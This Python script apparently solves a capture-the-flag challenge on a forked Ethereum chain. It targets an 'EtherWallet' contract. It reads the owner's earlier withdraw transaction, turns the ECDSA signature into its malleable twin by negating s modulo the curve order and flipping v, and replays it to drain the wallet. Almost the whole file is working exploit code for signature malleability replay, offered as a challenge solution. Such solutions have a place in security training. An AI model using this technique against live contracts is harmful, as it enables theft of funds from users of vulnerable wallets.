from ape import accounts, chain, Contract
from .utils.helper import fork, get_block, w3

BLOCK = 7475420
ETHER_WALLET_CONTRACT = "0x4b90946aB87BF6e1CA1F26b2af2897445F48f877"
ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141


def main():
    # --- BEFORE EXPLOIT --- # print("\n--- Setting up scenario ---\n")

    # setting up attacker
    attacker = accounts.test_accounts[0]

    # fork chain at block height
    print(f"\n--- Forking chain at block height: {BLOCK} ---\n")
    fork(BLOCK)
    assert get_block() == BLOCK

    # get challenge contract
    print("\n--- Getting Challenge Contracts ---\n")
    wallet = Contract(ETHER_WALLET_CONTRACT)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    sig_length = 65

    function_sig = w3.keccak(
        text="withdraw(bytes)",
    )[:4].hex()

    for tx in chain.provider.get_transactions_by_block(BLOCK):
        if tx.sender == wallet.owner() and tx.data[:4].hex() == function_sig:
            tx_params = tx.data[4:]
            break
    signature = tx_params[64 : 64 + sig_length]
    s = int(signature[32:64].hex(), 0)
    v = signature[-1]

    if ORDER > s:
        s_inverted = ORDER - s
    else:
        s_inverted = s - ORDER

    if v == 27:
        v_inverted = 28
    else:
        v_inverted = 27

    signature_replay = (
        signature[:32]
        + s_inverted.to_bytes(32, byteorder="big")
        + v_inverted.to_bytes(1, byteorder="big")
    )
    wallet.withdraw(signature_replay, sender=attacker)

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: You drained the wallet ---\n")

    assert wallet.balance == 0

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
